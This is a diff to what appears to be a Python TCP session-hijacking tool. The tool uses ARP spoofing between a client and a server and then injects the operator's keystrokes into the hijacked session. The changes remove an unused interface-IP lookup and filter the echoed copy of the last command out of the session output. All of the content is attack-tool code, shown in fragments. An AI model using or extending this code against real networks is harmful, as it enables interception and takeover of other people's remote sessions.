@@ -31,7 +31,6 @@ def check_args():
 def get_mac_addr(ip_addr, if_name):
     mac_addr = None
     if_mac = tools.get_mac_addr(if_name)
-    if_ip = tools.get_if_ipv4_addr(if_name)
     gw = tools.get_route_gateway(ip_addr)
     if gw is not None:
         ip_addr = gw
@@ -52,7 +51,6 @@ def get_mac_addr(ip_addr, if_name):
                         'src_addr': if_mac,
                         'dst_addr': 'ff:ff:ff:ff:ff:ff',
                         'snd_hw_addr': if_mac,
-                        #'snd_ip_addr': if_ip,
                         'snd_ip_addr': '0.0.0.0',
                         'tgt_hw_addr': '00:00:00:00:00:00',
                         'tgt_ip_addr': ip_addr
@@ -122,7 +120,8 @@ arp_data_server = {'operation': 2,
 arp_msg_server = eth.ArpMessage(arp_data_server)
 eth_handler = eth.EthernetHandler(if_name, local_mac=my_mac, remote_mac=client_mac, block=0)
 hijacked = False
-
+last_cmd = ''
+current_cmd = ''
 tcp_handler = None
 ch = chr(0)
 
@@ -182,6 +181,10 @@ try:
             ch = sys.stdin.read(1)
             if hijacked:
                 if ord(ch) != 4:
+                    current_cmd += ch
+                    if ord(ch) == 10:
+                        last_cmd = current_cmd
+                        current_cmd = ''
                     tcp_handler.send(ch.encode())
             else:
                 if ch in ('h', 'H'):
@@ -203,8 +206,9 @@ try:
                     new_tty_attr[3] |= termios.ECHO
                     termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
         if hijacked:
-            data = tcp_handler.receive(65535)
-            print(data.decode(), end='')
+            data = tcp_handler.receive(65535).decode()
+            if data != last_cmd:
+                print(data, end='')
 finally:
     termios.tcsetattr(sys.stdin, termios.TCSADRAIN, term_attr)
     if hijacked:
